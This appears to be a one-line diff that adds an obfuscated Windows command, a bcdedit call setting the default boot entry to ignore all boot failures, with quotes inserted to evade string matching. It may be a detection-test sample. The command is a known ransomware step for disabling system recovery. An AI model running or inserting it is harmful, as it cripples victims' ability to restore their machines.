@@ -1,0 +1,1 @@
+bcdedit.exe /set {default} boot"status"policy ignore"allfai"lures
